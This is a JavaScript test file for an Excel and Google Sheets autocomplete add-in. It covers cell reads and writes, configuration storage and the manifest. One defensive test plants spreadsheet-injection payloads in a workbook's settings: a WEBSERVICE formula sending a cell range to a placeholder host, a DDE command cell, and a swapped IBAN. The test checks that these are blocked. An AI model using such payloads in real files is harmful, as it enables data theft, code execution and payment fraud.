// The two host bridges and the sidebar page, driven headlessly: taskpane.js
// against a fake Excel workbook behind Office.js, apps-script/Code.gs against
// fake SpreadsheetApp and PropertiesService, the inline script of
// Sidebar.html against a deferred google.script.run; plus the manifest and
// the pages as text. The real hosts were not run here (README.md).
const test = require("node:test");
const assert = require("node:assert/strict");
const fs = require("node:fs");
const path = require("node:path");
const vm = require("node:vm");
const sheets = require("../../core/sheets.js");
const { SAMPLE_SECTION } = require("../../desktop/apps/sheets/sample.js");
const { Node, fakeDocument, sandboxed, plain, storageOf, fakeExcel, fakeAppsScript, fakeGoogleRun } = require("./fakes.js");

const ADDIN = path.join(__dirname, "..");
const CONFIG = JSON.stringify(sheets.exportConfig(SAMPLE_SECTION));
const ORDERS = [
  ["Order", "Customer", "Amount", "Delivery notes"],
  ["A-1", "ACME", "100", "Customer called about the late delivery."],
  ["A-2", "Zed Transport", "250", ""],
  ["A-3", "acm", "", "Driver was late. Prom"],
  ["A-4", "Zed Transport", "80", "Customer called about the late delivery. Promised a call back."],
  ["A-5", "Birch & Co", "", "Parcel left at the side entrance. Promised a call back."],
];

function excelPane(spec) {
  const host = fakeExcel(spec);
  const root = new Node("div");
  const globals = { Excel: host.Excel, Office: host.Office, document: fakeDocument({ pane: root }), localStorage: storageOf(), ActleSheets: sheets };
  const sandbox = sandboxed(path.join(ADDIN, "pane.js"), globals);
  vm.runInContext(fs.readFileSync(path.join(ADDIN, "taskpane.js"), "utf8"), sandbox, { filename: "taskpane.js" });
  return { host, root, bridge: sandbox.ActleSheetsExcel, sandbox };
}

test("the Excel bridge reads the active cell's text, its header and the column's displayed values without the cell itself", async () => {
  const { host, bridge } = excelPane({ sheets: { "Orders 2026": ORDERS }, active: { sheet: "Orders 2026", address: "B4" } });
  assert.deepEqual(plain(await bridge.readContext()), { sheet: "Orders 2026", address: "B4", text: "acm", header: "Customer", values: ["ACME", "Zed Transport", "Zed Transport", "Birch & Co"], clipped: false });
  assert.equal(host.state.syncs, 2, "two round trips: the selection, then the header and the column");
  await host.select("Orders 2026", "D2");
  assert.deepEqual(plain(await bridge.readContext()).values, ["", "Driver was late. Prom", "Customer called about the late delivery. Promised a call back.", "Parcel left at the side entrance. Promised a call back."], "rows after the cell are kept, the cell's own row is left out");
  const lower = [[], [], [], [], ["Code", "x"], ["CC-100", "y"], ["CC-200", "z"]];
  const used = excelPane({ sheets: { Codes: lower }, active: { sheet: "Codes", address: "A6" } });
  assert.deepEqual(plain(await used.bridge.readContext()), { sheet: "Codes", address: "A6", text: "CC-100", header: "", values: ["Code", "CC-200"], clipped: false }, "a used range that starts below row 1 is read from its first row; row 1 is still the header");
  const headerOnly = excelPane({ sheets: { Empty: [["Customer", "Amount"]] }, active: { sheet: "Empty", address: "A2" } });
  assert.deepEqual(plain(await headerOnly.bridge.readContext()), { sheet: "Empty", address: "A2", text: "", header: "Customer", values: [], clipped: false });
  const blank = excelPane({ sheets: { Blank: [[]] }, active: { sheet: "Blank", address: "C3" } });
  assert.deepEqual(plain(await blank.bridge.readContext()), { sheet: "Blank", address: "C3", text: "", header: "", values: [], clipped: false });
  const long = [["Customer"]].concat(Array.from({ length: bridge.MAX_ROWS + 2 }, (_, i) => ["Row " + (i + 2)]));
  const big = excelPane({ sheets: { Big: long }, active: { sheet: "Big", address: "A2" } });
  const clipped = plain(await big.bridge.readContext());
  assert.equal(clipped.clipped, true);
  assert.equal(clipped.values.length, bridge.MAX_ROWS - 1, "the first MAX_ROWS rows, minus the selected one");
  assert.equal(clipped.values[0], "Row 3");
});

test("the Excel bridge writes a completion as text, a block as a rectangle with text cells as text, and a formula as a formula", async () => {
  const { host, bridge } = excelPane({ sheets: { "Orders 2026": ORDERS }, active: { sheet: "Orders 2026", address: "B4" } });
  await bridge.writeValue({ sheet: "Orders 2026", address: "B4" }, "Acme Logistics GmbH");
  assert.deepEqual(host.calls.splice(0), [["numberFormat", "'Orders 2026'!B4", [["@"]]], ["values", "'Orders 2026'!B4", [["Acme Logistics GmbH"]]]], "the text format is set before the value");
  assert.equal(host.grids["Orders 2026"][3][1], "Acme Logistics GmbH");
  await bridge.writeValue({ sheet: "Orders 2026", address: "C4" }, 21.5);
  assert.deepEqual(host.calls.splice(0), [["numberFormat", "'Orders 2026'!C4", [["@"]]], ["values", "'Orders 2026'!C4", [["21.5"]]]], "always a string");
  await bridge.writeRows({ sheet: "Orders 2026", address: "A8" }, [["Date", "Amount", "Cost centre"], ["", 0, true]]);
  assert.deepEqual(host.calls.splice(0), [
    ["numberFormat", "'Orders 2026'!A8:C9", [["@", "@", "@"], ["@", "General", "General"]]],
    ["values", "'Orders 2026'!A8:C9", [["Date", "Amount", "Cost centre"], ["", 0, true]]],
  ]);
  assert.deepEqual(host.grids["Orders 2026"][8], ["", 0, true]);
  await bridge.writeFormula({ sheet: "Orders 2026", address: "C7" }, "=ROUND(B2*0.19, 2)");
  assert.deepEqual(host.calls.pop(), ["formulas", "'Orders 2026'!C7", [["=ROUND(B2*0.19, 2)"]]]);
  await assert.rejects(bridge.writeValue({ sheet: "Gone", address: "A1" }, "x"), /worksheet Gone not found/);
});

test("the Excel bridge keeps the configuration in the document settings and reports a save that failed", async () => {
  const { host, bridge } = excelPane({ sheets: { S: [["a"]] }, active: { sheet: "S", address: "A1" } });
  assert.equal(await bridge.loadConfig(), "");
  await bridge.saveConfig(CONFIG);
  assert.equal(host.settings.get(bridge.SETTING), CONFIG);
  assert.deepEqual(host.calls, [["saveAsync"]]);
  assert.equal(await bridge.loadConfig(), CONFIG);
  await bridge.saveConfig(undefined);
  assert.equal(await bridge.loadConfig(), "", "nothing stays nothing");
  const failing = excelPane({ sheets: { S: [["a"]] }, active: { sheet: "S", address: "A1" }, failSave: "the workbook is read-only" });
  await assert.rejects(failing.bridge.saveConfig(CONFIG), /the workbook is read-only/);
  const fired = [];
  bridge.onSelectionChanged(() => fired.push("changed"));
  assert.deepEqual(host.handlers.map(([type]) => type), ["documentSelectionChanged"]);
  await host.select("S", "A1");
  assert.deepEqual(fired, ["changed"]);
});

test("Office.onReady builds the pane in Excel and says so elsewhere; the pane then follows the selection", async () => {
  const { host, root, bridge, sandbox } = excelPane({ sheets: { "Orders 2026": ORDERS }, active: { sheet: "Orders 2026", address: "B4" }, settings: { actleSheetsConfig: CONFIG } });
  assert.equal(host.Office.ready, bridge.start, "start is registered with Office.onReady");
  assert.equal(bridge.start({ host: "Word" }), null);
  assert.equal(root.textContent, "extle runs in Excel. Open this pane from an Excel workbook.");
  const pane = bridge.start({ host: host.Office.HostType.Excel });
  await new Promise((resolve) => setImmediate(resolve));
  assert.equal(pane.ui.context.textContent, 'B4 on Orders 2026, column "Customer": label column, 4 values', "the workbook's configuration is offered, not applied");
  await pane.ui.origin.button("Use the document's configuration").click();
  assert.equal(pane.ui.context.textContent, 'B4 on Orders 2026, column "Customer": vocabulary customers');
  assert.equal(pane.ui.summary.textContent, "This document's configuration, in use instead of the text above: 2 vocabularies (customers, costCentres), 3 column rules, 2 blocks.");
  assert.deepEqual(pane.ui.completions.all((n) => n.className === "completion").map((b) => b.textContent), ["Acme Logistics GmbH", "Northern Acme Ltd"]);
  await pane.ui.completions.all((n) => n.className === "completion")[0].click();
  assert.equal(host.grids["Orders 2026"][3][1], "Acme Logistics GmbH");
  await host.select("Orders 2026", "D4");
  assert.equal(pane.ui.input.value, "Driver was late. Prom");
  assert.deepEqual(pane.ui.completions.all((n) => n.className === "completion").map((b) => b.textContent), ["Promised a call back."]);
  assert.equal(sandbox.localStorage.getItem("actleSheetsConfig"), null, "the document had the configuration; using it never copies it into the browser");
});

test("a task pane that cannot start says so under the extle name", async () => {
  const { host, root, bridge } = excelPane({ sheets: { S: [["a"]] }, active: { sheet: "S", address: "A1" } });
  // Any error out of the pane's start(); here the fake refuses the selection handler.
  host.Office.context.document.addHandlerAsync = () => { throw new Error("no selection events"); };
  bridge.start({ host: host.Office.HostType.Excel });
  await new Promise((resolve) => setImmediate(resolve));
  assert.equal(root.textContent, "extle could not start: no selection events");
});

test("a workbook whose settings carry another configuration cannot replace the organisation's, write its rows or formula unseen, or reach the browser copy", async () => {
  const formula = '=WEBSERVICE("https://example.invalid/?d="&ENCODEURL(TEXTJOIN(",",1,A1:Z200)))';
  const carried = JSON.stringify({
    vocabularies: { customers: ["Acme Logistics GmbH - new IBAN DE00 0000 0000 0000 0000 00"] },
    columns: [{ match: { header: "customer" }, vocabulary: "customers" }],
    blocks: [{ trigger: "/total", label: "Totals row", formula }, { trigger: "/sig", label: "Signature block", rows: [["=HYPERLINK(\"https://example.invalid/\",\"Approved\")", "+1+1"], ["-cmd|' /C calc'!A0", "@SUM(A1:A2)"]] }, { trigger: "/pad", label: "Padding", rows: [["", ""], ["", ""]] }],
  });
  const sheet = ORDERS.concat([["/total", "", "", ""], ["/sig", "", "", ""], ["/pad", "keep me", "", ""]]);
  const { host, root, bridge, sandbox } = excelPane({ sheets: { "Orders 2026": sheet }, active: { sheet: "Orders 2026", address: "B4" }, settings: { actleSheetsConfig: carried } });
  sandbox.localStorage.setItem("actleSheetsConfig", CONFIG);
  const pane = bridge.start({ host: host.Office.HostType.Excel });
  await new Promise((resolve) => setImmediate(resolve));
  assert.deepEqual(pane.ui.completions.all((n) => n.className === "completion").map((b) => b.textContent), ["Acme Logistics GmbH", "Northern Acme Ltd"], "the organisation's vocabulary, not the workbook's");
  assert.match(pane.ui.origin.textContent, /^This document carries its own extle configuration in its settings\..*would add block "\/total" \(formula =WEBSERVICE\(.*remove block "\/vat"\./s, "the formula block is listed first, the triggers quoted");
  assert.doesNotMatch(pane.ui.origin.textContent, /\/sig/, "the formula-like rows block was dropped when the configuration was read");
  for (const address of ["A7", "A8", "A9"]) {
    await host.select("Orders 2026", address);
    assert.equal(root.find((n) => n.className === "block").textContent, "", address + ": no Insert button from the workbook's configuration");
  }
  await pane.ui.origin.button("Use the document's configuration").click();
  await host.select("Orders 2026", "A7");
  await pane.ui.block.button("Insert Totals row (formula " + formula + ")").click();
  assert.equal(host.calls.some(([what]) => what === "formulas" || what === "values"), false, "Insert alone writes nothing");
  assert.equal(pane.ui.block.find((n) => n.className === "formula").textContent, formula);
  await host.select("Orders 2026", "A8");
  assert.equal(pane.ui.block.textContent, "", "still no rows block");
  await host.select("Orders 2026", "A9");
  await pane.ui.block.button("Insert Padding (2 rows x 2 columns)").click();
  assert.equal(host.calls.some(([what]) => what === "formulas" || what === "values"), false, "rows from the workbook's configuration: Insert alone writes nothing either");
  assert.equal(pane.ui.block.find((n) => n.className === "confirm").textContent, "These rows come from this document's configuration, not your organisation's. Write them into A9:B10, replacing what those 4 cells hold now?");
  assert.equal(host.grids["Orders 2026"][8][1], "keep me");
  await pane.ui.block.button("Write the rows").click();
  assert.deepEqual(host.calls.splice(0).filter(([what]) => what === "values"), [["values", "'Orders 2026'!A9:B10", [["", ""], ["", ""]]]], "the range the question named is the one Office.js writes");
  await pane.ui.save.click();
  assert.equal(sandbox.localStorage.getItem("actleSheetsConfig"), CONFIG, "Save keeps the organisation's copy in the browser");
  assert.equal(host.settings.get(bridge.SETTING), CONFIG, "and puts it in the workbook in place of the carried one");
  assert.equal(host.calls.some(([what]) => what === "formulas" || what === "values"), false);
});

function appsScript(spec) {
  const fake = fakeAppsScript(spec);
  const context = vm.createContext(Object.assign({}, fake.globals));
  vm.runInContext(fs.readFileSync(path.join(ADDIN, "apps-script", "Code.gs"), "utf8"), context, { filename: "Code.gs" });
  return { fake, gs: context };
}

test("Code.gs reads the selection as displayed text without the cell itself, within the row limit", () => {
  const { fake, gs } = appsScript({ sheets: { "Orders 2026": ORDERS }, active: { sheet: "Orders 2026", row: 4, col: 2 } });
  assert.deepEqual(plain(gs.getActiveCellContext(5000)), { sheet: "Orders 2026", address: "B4", text: "acm", header: "Customer", values: ["ACME", "Zed Transport", "Zed Transport", "Birch & Co"], clipped: false });
  assert.deepEqual(plain(gs.getActiveCellContext(2)), { sheet: "Orders 2026", address: "B4", text: "acm", header: "Customer", values: ["ACME", "Zed Transport"], clipped: true }, "the first rows only, marked clipped");
  assert.deepEqual(plain(gs.getActiveCellContext(3)).values, ["ACME", "Zed Transport"], "the selected row inside the limit is still left out");
  fake.select("Orders 2026", 2, 4);
  assert.deepEqual(plain(gs.getActiveCellContext("nope")).values, ["", "Driver was late. Prom", "Customer called about the late delivery. Promised a call back.", "Parcel left at the side entrance. Promised a call back."], "an odd limit means the default");
  assert.deepEqual(plain(gs.getActiveCellContext(1e9)).values.length, 4, "capped, not the whole sheet");
  const { gs: empty } = appsScript({ sheets: { Empty: [["Customer"]] }, active: { sheet: "Empty", row: 2, col: 1 } });
  assert.deepEqual(plain(empty.getActiveCellContext(5000)), { sheet: "Empty", address: "A2", text: "", header: "Customer", values: [], clipped: false });
});

test("Code.gs writes a completion as text, a block as a rectangle and a formula, and names a sheet that is gone", () => {
  const { fake, gs } = appsScript({ sheets: { "Orders 2026": ORDERS }, active: { sheet: "Orders 2026", row: 4, col: 2 } });
  gs.writeValue({ sheet: "Orders 2026", address: "B4" }, "Acme Logistics GmbH");
  assert.deepEqual(fake.calls.splice(0), [["setNumberFormat", "B4", "@"], ["setValue", "B4", "Acme Logistics GmbH"]], "the text format is set before the value");
  assert.equal(fake.grids["Orders 2026"][3][1], "Acme Logistics GmbH");
  gs.writeValue({ sheet: "Orders 2026", address: "C4" }, 21.5);
  assert.deepEqual(fake.calls.splice(0), [["setNumberFormat", "C4", "@"], ["setValue", "C4", "21.5"]], "always a string");
  gs.writeRows({ sheet: "Orders 2026", address: "A8" }, [["Date", "Amount", "Cost centre"], ["", 0, true]]);
  assert.deepEqual(fake.calls.splice(0), [
    ["setNumberFormats", "A8:C9", [["@", "@", "@"], ["@", "General", "General"]]],
    ["setValues", "A8:C9", [["Date", "Amount", "Cost centre"], ["", 0, true]]],
  ]);
  gs.writeFormula({ sheet: "Orders 2026", address: "C7" }, "=ROUND(B2*0.19, 2)");
  assert.deepEqual(fake.calls.pop(), ["setFormula", "C7", "=ROUND(B2*0.19, 2)"]);
  assert.throws(() => gs.writeValue({ sheet: "Gone", address: "A1" }, "x"), /sheet Gone is gone/);
});

test("Code.gs keeps the configuration in document properties cut by UTF-8 bytes, shrinks cleanly, and leaves nothing half-written", () => {
  const { fake, gs } = appsScript({ sheets: {}, active: {} });
  assert.equal(gs.loadConfig(), "");
  const cyrillic = JSON.stringify({ vocabularies: { клиенты: { values: Array.from({ length: 1200 }, (_, i) => "Клиент номер " + i) } } });
  assert.ok(cyrillic.length > 8000 && Buffer.byteLength(cyrillic) > 3 * 9216, "longer than one property in either unit");
  gs.saveConfig(cyrillic);
  assert.equal(gs.loadConfig(), cyrillic);
  const chunks = [...fake.props.keys()].filter((key) => /\.\d+$/.test(key));
  assert.equal(fake.props.get("actleSheetsConfig.count"), String(chunks.length));
  for (const key of chunks) assert.ok(Buffer.byteLength(fake.props.get(key)) <= gs.CHUNK_BYTES, key + " fits a property");
  assert.ok(chunks.length >= Math.ceil(Buffer.byteLength(cyrillic) / gs.CHUNK_BYTES));
  assert.equal(fake.calls[0][1], "actleSheetsConfig.count", "the count is reset first");
  assert.equal(fake.calls[0][2], 1);
  assert.deepEqual(fake.calls[fake.calls.length - 1].slice(0, 2), ["setProperty", "actleSheetsConfig.count"], "and set last");
  fake.calls.length = 0;
  gs.saveConfig(CONFIG);
  assert.equal(gs.loadConfig(), CONFIG);
  assert.deepEqual([...fake.props.keys()].sort(), ["actleSheetsConfig.0", "actleSheetsConfig.count"], "stale chunks are deleted");
  assert.equal(fake.calls.filter(([what]) => what === "deleteProperty").length, chunks.length - 1);
  gs.saveConfig("");
  assert.equal(gs.loadConfig(), "");
  assert.equal(fake.props.get("actleSheetsConfig.count"), "0");
  const emoji = "x".repeat(8191) + "😀" + "y".repeat(10);
  assert.deepEqual(plain(gs.chunkByBytes(emoji, 8192)), ["x".repeat(8191), "😀" + "y".repeat(10)], "a surrogate pair is never split");
  assert.deepEqual(plain(gs.chunkByBytes("ab", 1)), ["a", "b"]);
  assert.deepEqual(plain(gs.chunkByBytes("€€", 3)), ["€", "€"]);
  assert.deepEqual(plain(gs.chunkByBytes("😀", 1)), ["😀"], "a pair wider than the limit stays whole");
  assert.equal(gs.chunkByBytes(cyrillic, 100).join(""), cyrillic);
  const halfway = appsScript({ sheets: {}, active: {}, properties: { "actleSheetsConfig.count": "2", "actleSheetsConfig.0": "{\"old\":", "actleSheetsConfig.1": "1}" }, failAt: 3 });
  assert.equal(halfway.gs.loadConfig(), "{\"old\":1}");
  assert.throws(() => halfway.gs.saveConfig(cyrillic), /property write failed/);
  assert.equal(halfway.gs.loadConfig(), "", "no mix of old and new chunks: nothing, so the sidebar uses the browser's copy");
  const missing = appsScript({ sheets: {}, active: {}, properties: { "actleSheetsConfig.count": "2", "actleSheetsConfig.0": "{" } });
  assert.equal(missing.gs.loadConfig(), "", "a missing chunk is not glued to the others");
});

test("Code.gs adds the menu, opens the sidebar and serves the includes", () => {
  const { fake, gs } = appsScript({ sheets: {}, active: {} });
  gs.onOpen();
  assert.equal(fake.ui.menus[0].title, "extle");
  assert.deepEqual(fake.ui.menus[0].items, [["Open sidebar", "showSidebar"]]);
  gs.showSidebar();
  assert.deepEqual(fake.ui.sidebars, [{ file: "Sidebar", title: "extle" }]);
  assert.equal(gs.include("sheets-core"), "<!-- include sheets-core -->");
});

test("the sidebar page talks to Code.gs through google.script.run, asks for 5000 rows, and skips a poll while one is pending", async () => {
  const { fake, gs } = appsScript({ sheets: { "Orders 2026": ORDERS }, active: { sheet: "Orders 2026", row: 4, col: 2 }, properties: {} });
  gs.saveConfig(CONFIG);
  const server = fakeGoogleRun({ getActiveCellContext: gs.getActiveCellContext, writeValue: gs.writeValue, writeRows: gs.writeRows, writeFormula: gs.writeFormula, loadConfig: gs.loadConfig, saveConfig: gs.saveConfig }, { deferred: true });
  const root = new Node("div");
  const ticks = [];
  // No copy in this browser: what loadConfig returns reaches the pane only as the offer below.
  const globals = { google: { script: { run: server.run } }, document: fakeDocument({ pane: root }), localStorage: storageOf(), ActleSheets: sheets, setInterval: (fn, ms) => ticks.push({ fn, ms }) };
  const sandbox = sandboxed(path.join(ADDIN, "pane.js"), globals);
  const html = fs.readFileSync(path.join(ADDIN, "apps-script", "Sidebar.html"), "utf8");
  vm.runInContext(/<script>([\s\S]*?)<\/script>/.exec(html)[1], sandbox, { filename: "Sidebar.html" });
  const settle = () => new Promise((resolve) => setImmediate(resolve));
  await settle();
  assert.deepEqual(server.calls.splice(0), [["loadConfig"]]);
  server.flush();
  await settle();
  assert.deepEqual(server.calls.splice(0), [["getActiveCellContext", 5000]]);
  server.flush();
  await settle();
  const pane = root.find((n) => n.className === "context");
  const origin = root.find((n) => n.className === "origin");
  assert.equal(origin.textContent,
    "This document carries its own extle configuration in its settings. It travels with the file, so whoever saved the file chose it; it is not your organisation's configuration. This browser has none yet: paste the file the actle desktop app exports under Settings."
    + "Using the document's would add block \"/vat\" (formula =ROUND(B2*0.19, 2)); add vocabulary \"customers\" (4 values); add vocabulary \"costCentres\" (3 values); replace the column rules (3 instead of 0); add block \"/exp\" (2 rows x 3 columns)."
    + "Use the document's configuration" + "Not now", "the spreadsheet's configuration, as Code.gs's loadConfig returned it through google.script.run, is offered");
  assert.equal(pane.textContent, 'B4 on Orders 2026, column "Customer": label column, 4 values', "and not applied before the person chooses it");
  await origin.button("Use the document's configuration").click();
  assert.equal(pane.textContent, 'B4 on Orders 2026, column "Customer": vocabulary customers');
  assert.deepEqual(ticks.map((t) => t.ms), [2000]);
  ticks[0].fn();
  ticks[0].fn();
  await settle();
  assert.deepEqual(server.calls.splice(0), [["getActiveCellContext", 5000]], "the second tick is skipped while the first is on its way");
  server.flush();
  await settle();
  ticks[0].fn();
  await settle();
  assert.deepEqual(server.calls.splice(0), [["getActiveCellContext", 5000]], "and runs again once it answered");
  server.flush();
  await settle();
  const clicked = root.all((n) => n.className === "completion")[0].click(); // the write waits for the server's answer
  server.flush();
  await clicked;
  assert.deepEqual(server.calls.splice(0), [["writeValue", { sheet: "Orders 2026", address: "B4" }, "Acme Logistics GmbH"]]);
  assert.equal(fake.grids["Orders 2026"][3][1], "Acme Logistics GmbH");
  assert.equal(root.find((n) => n.className === "message").textContent, 'Wrote "Acme Logistics GmbH" to B4.');
  fake.select("Gone", 1, 1); // no such sheet: the server function throws
  ticks[0].fn();
  await settle();
  server.flush();
  await settle();
  assert.match(root.find((n) => n.className === "message").textContent, /^Cannot read the selection: /, "a failure handler becomes an Error with its message");
  assert.equal(sandbox.localStorage.getItem("actleSheetsConfig"), null, "using the spreadsheet's configuration never copies it into the browser");
});

test("a sidebar that cannot start says so under the extle name", async () => {
  const { gs } = appsScript({ sheets: { S: [["a"]] }, active: { sheet: "S", row: 1, col: 1 }, properties: {} });
  const server = fakeGoogleRun({ getActiveCellContext: gs.getActiveCellContext, loadConfig: gs.loadConfig, saveConfig: gs.saveConfig });
  const root = new Node("div");
  // Any error out of the pane's start(); here the page cannot set up its poll.
  const globals = { google: { script: { run: server.run } }, document: fakeDocument({ pane: root }), localStorage: storageOf(), ActleSheets: sheets, setInterval: () => { throw new Error("no timers"); } };
  const sandbox = sandboxed(path.join(ADDIN, "pane.js"), globals);
  const html = fs.readFileSync(path.join(ADDIN, "apps-script", "Sidebar.html"), "utf8");
  vm.runInContext(/<script>([\s\S]*?)<\/script>/.exec(html)[1], sandbox, { filename: "Sidebar.html" });
  await new Promise((resolve) => setImmediate(resolve));
  assert.equal(root.textContent, "extle could not start: no timers");
});

/** Open and close tags must nest; comments, the prolog and self-closing tags are skipped. */
function xmlBalanced(xml) {
  const stack = [];
  for (const match of xml.replace(/<!--[\s\S]*?-->/g, "").matchAll(/<(\/?)([A-Za-z:][\w:.-]*)[^>]*?(\/?)>/g)) {
    if (match[3]) continue;
    if (match[1]) {
      if (stack.pop() !== match[2]) return false;
    } else stack.push(match[2]);
  }
  return stack.length === 0;
}

test("the Office manifest, the pages and the Apps Script files are consistent with the build", () => {
  const manifest = fs.readFileSync(path.join(ADDIN, "manifest.xml"), "utf8");
  assert.equal(xmlBalanced(manifest), true);
  assert.equal(xmlBalanced("<a><b></a>"), false);
  assert.match(manifest, /<Id>7b1f6c9a-0000-4000-8000-000000000001<\/Id>/);
  assert.match(manifest, /<SourceLocation DefaultValue="https:\/\/localhost:3000\/taskpane.html"\/>/);
  assert.match(manifest, /<Set Name="ExcelApi" MinVersion="1.7"\/>/);
  assert.equal([...manifest.matchAll(/https:\/\/(?!localhost:3000)/g)].length, 0, "every URL is the documented placeholder");
  assert.match(manifest, /placeholder GUID/);
  const page = fs.readFileSync(path.join(ADDIN, "taskpane.html"), "utf8");
  for (const src of ["https://appsforoffice.microsoft.com/lib/1/hosted/office.js", "dist/sheets-core.js", "pane.js", "taskpane.js"]) assert.ok(page.includes('src="' + src + '"'), src);
  assert.equal([...page.matchAll(/src="https?:/g)].length, 1, "Office.js is the one external script");
  assert.equal(/\son\w+="/.test(page), false, "no inline handlers");
  const sidebar = fs.readFileSync(path.join(ADDIN, "apps-script", "Sidebar.html"), "utf8");
  assert.ok(sidebar.includes('<?!= include("sheets-core"); ?>') && sidebar.includes('<?!= include("pane"); ?>'));
  const ignored = fs.readFileSync(path.join(ADDIN, ".gitignore"), "utf8");
  for (const line of ["dist/", "apps-script/sheets-core.html", "apps-script/pane.html"]) assert.ok(ignored.split("\n").includes(line), line + " is not committed");
  const appsscript = JSON.parse(fs.readFileSync(path.join(ADDIN, "apps-script", "appsscript.json"), "utf8"));
  assert.equal(appsscript.runtimeVersion, "V8");
  assert.deepEqual(appsscript.oauthScopes, ["https://www.googleapis.com/auth/spreadsheets.currentonly", "https://www.googleapis.com/auth/script.container.ui"], "the current spreadsheet only");
});

test("the add-in is named extle wherever Excel shows it, within the manifest's documented lengths", () => {
  const manifest = fs.readFileSync(path.join(ADDIN, "manifest.xml"), "utf8");
  const attr = (pattern) => (manifest.match(pattern) || [])[1];
  assert.equal(attr(/<DisplayName DefaultValue="([^"]*)"\/>/), "extle");
  assert.match(attr(/<Description DefaultValue="([^"]*)"\/>/), /^extle: /);
  assert.equal(attr(/<bt:String id="actle\.Group\.Label" DefaultValue="([^"]*)"\/>/), "extle", "the ribbon group");
  assert.equal(attr(/<bt:String id="actle\.OpenPane\.Label" DefaultValue="([^"]*)"\/>/), "Open extle", "the button and its supertip title");
  assert.match(attr(/<bt:String id="actle\.OpenPane\.Tip" DefaultValue="([^"]*)"\/>/), /^Open the extle pane: /);
  assert.match(manifest, /<ProviderName>actle<\/ProviderName>/, "the provider stays actle");
  // learn.microsoft.com/javascript/api/manifest: Description up to 250 characters, a LongStrings string up to 250.
  // The DisplayName and the ShortStrings are pinned exactly, so their 125-character limits need no check of their own.
  assert.ok(attr(/<Description DefaultValue="([^"]*)"\/>/).length <= 250);
  const strings = (block) => [...(manifest.match(new RegExp("<bt:" + block + ">([\\s\\S]*?)</bt:" + block + ">")) || ["", ""])[1].matchAll(/DefaultValue="([^"]*)"/g)].map((m) => m[1]);
  assert.deepEqual(strings("ShortStrings"), ["extle", "Open extle"]);
  assert.equal(strings("LongStrings").length, 1);
  assert.ok(strings("LongStrings").every((text) => text.length <= 250));
  const page = fs.readFileSync(path.join(ADDIN, "taskpane.html"), "utf8");
  assert.match(page, /<title>extle<\/title>/);
});
